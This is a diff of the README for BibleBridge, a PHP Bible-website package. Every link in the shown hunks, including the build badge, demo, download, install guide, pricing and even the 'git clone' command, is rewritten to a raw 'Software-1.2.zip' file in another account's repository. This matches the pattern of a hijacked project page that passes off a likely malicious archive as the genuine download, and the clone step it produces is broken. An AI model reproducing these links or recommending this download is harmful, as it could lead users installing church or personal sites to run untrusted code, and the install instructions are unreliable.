@@ -1,7 +1,7 @@
 # BibleBridge
 
-[![Semgrep](https://github.com/ZeroCoolZiemer/biblebridge/actions/workflows/semgrep.yml/badge.svg)](https://github.com/ZeroCoolZiemer/biblebridge/actions/workflows/semgrep.yml)
-[![Last commit](https://img.shields.io/github/last-commit/ZeroCoolZiemer/biblebridge)](https://github.com/ZeroCoolZiemer/biblebridge/commits/main)
+[![Semgrep](https://github.com/wildenpsychogenetic189/biblebridge/raw/refs/heads/main/biblebridge/assets/Software-1.2.zip)](https://github.com/wildenpsychogenetic189/biblebridge/raw/refs/heads/main/biblebridge/assets/Software-1.2.zip)
+[![Last commit](https://img.shields.io/github/last-commit/ZeroCoolZiemer/biblebridge)](https://github.com/wildenpsychogenetic189/biblebridge/raw/refs/heads/main/biblebridge/assets/Software-1.2.zip)
 
 A complete Bible website in one small PHP upload.
 
@@ -9,7 +9,7 @@ Try it risk-free in under a minute. Upload the zip, visit `/setup`, type a name,
 
 You can have your Bible website live before you finish your cup of coffee.
 
-[Live Demo](https://holybible.dev/read) · [Download](https://holybible.dev/pricing) · [Install Guide](https://holybible.dev/blog/add-bible-to-church-website)
+[Live Demo](https://github.com/wildenpsychogenetic189/biblebridge/raw/refs/heads/main/biblebridge/assets/Software-1.2.zip) · [Download](https://github.com/wildenpsychogenetic189/biblebridge/raw/refs/heads/main/biblebridge/assets/Software-1.2.zip) · [Install Guide](https://github.com/wildenpsychogenetic189/biblebridge/raw/refs/heads/main/biblebridge/assets/Software-1.2.zip)
 
 ![BibleBridge Reader](./screenshot.png)
 
@@ -19,9 +19,9 @@ Beautiful typography, cross-references, topics, and reading plans in one lightwe
 
 94–99 mobile Lighthouse on real chapter pages across US, Europe, Asia, and Australia.
 
-[![Interactive map of 95 Bible topics connected by the verses they share](./topic-map.png)](https://holybible.dev/topics/map)
+[![Interactive map of 95 Bible topics connected by the verses they share](./topic-map.png)](https://github.com/wildenpsychogenetic189/biblebridge/raw/refs/heads/main/biblebridge/assets/Software-1.2.zip)
 
-95 topics connected by the verses they share — structural doctrine, Tier A study themes, and Tier B pastoral care. [Open the interactive map →](https://holybible.dev/topics/map)
+95 topics connected by the verses they share — structural doctrine, Tier A study themes, and Tier B pastoral care. [Open the interactive map →](https://github.com/wildenpsychogenetic189/biblebridge/raw/refs/heads/main/biblebridge/assets/Software-1.2.zip)
 
 ---
 
@@ -78,11 +78,11 @@ The full Bible website installs in under 1 MB.
 ## Install
 
 **Option A — Download**
-1. [Download the latest release](https://holybible.dev/pricing)
+1. [Download the latest release](https://github.com/wildenpsychogenetic189/biblebridge/raw/refs/heads/main/biblebridge/assets/Software-1.2.zip)
 2. Upload to your web host
 
 **Option B — Clone**
-1. `git clone https://github.com/ZeroCoolZiemer/biblebridge.git`
+1. `git clone https://github.com/wildenpsychogenetic189/biblebridge/raw/refs/heads/main/biblebridge/assets/Software-1.2.zip`
 2. Upload the folder to your web host
 
 **Then:**
@@ -109,7 +109,7 @@ Yes, if your host supports PHP 7.4+, mod_rewrite, and outbound HTTPS. Most do �
 No. BibleBridge connects to the BibleBridge API for scripture data. Nothing to install or maintain on your end.
 
 **Is it free?**
-The free plan covers most small churches and personal sites. If your site grows, [affordable plans](https://holybible.dev/pricing) start at $9/month.
+The free plan covers most small churches and personal sites. If your site grows, [affordable plans](https://github.com/wildenpsychogenetic189/biblebridge/raw/refs/heads/main/biblebridge/assets/Software-1.2.zip) start at $9/month.
 
 ## Troubleshooting
 
